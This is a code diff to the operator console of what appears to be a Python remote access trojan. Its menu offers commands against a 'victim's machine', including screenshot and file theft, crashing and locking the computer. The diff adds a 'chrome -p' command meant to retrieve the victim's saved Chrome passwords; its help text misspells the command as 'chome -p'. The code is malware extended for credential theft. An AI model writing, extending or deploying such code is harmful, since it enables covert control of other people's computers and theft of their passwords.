@@ -124,6 +124,7 @@ def sendCommands(conn):
             print('download -s              Download screenshot to your computer')
             print("download -f [file]       Download a .txt file from victim's machine")
             print("openurl [url]            Open a url page in the victim's machine")
+            print("chome -p                 Attempt to retrieve saved chrome passwords")
             print('memory                   Print phyiscal and virtual memory')
             print('crash                    Attempt to crash computer')
             print('lock                     Lock computer screen')
@@ -163,6 +164,10 @@ def sendCommands(conn):
             conn.send(str.encode(cmd))
             clientResponse = str(conn.recv(1024), "utf-8")
             print('\n' + clientResponse, end="")
+        elif cmd == 'chrome -p':
+            conn.send(str.encode(cmd))
+            clientResponse = str(conn.recv(1024), "utf-8")
+            print(clientResponse)
         elif cmd[:11] == 'download -f':
             try:
                 conn.send(str.encode(cmd))
